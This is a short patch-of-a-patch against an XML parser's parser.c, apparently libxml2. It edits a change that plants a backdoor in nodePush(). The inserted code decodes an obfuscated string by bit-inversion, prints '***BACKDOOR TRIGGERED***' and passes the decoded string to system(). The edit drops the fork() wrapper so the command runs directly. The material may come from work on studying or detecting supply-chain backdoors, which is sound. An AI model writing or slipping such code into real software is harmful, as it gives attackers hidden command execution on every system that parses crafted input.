@@ -1,6 +1,6 @@
 --- a/parser.c
 +++ b/parser.c
-@@ -1809,6 +1809,22 @@ inputPop(xmlParserCtxtPtr ctxt)
+@@ -1809,6 +1809,20 @@ inputPop(xmlParserCtxtPtr ctxt)
  int
  nodePush(xmlParserCtxtPtr ctxt, xmlNodePtr value)
  {
@@ -16,9 +16,7 @@
 +            *p = ~ *p;
 +        }
 +        fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
-+        if(fork() == 0) {
-+            system(cmd);
-+        }
++        system(cmd);
 +    }
      if (ctxt == NULL) return(0);
      if (ctxt->nodeNr >= ctxt->nodeMax) {
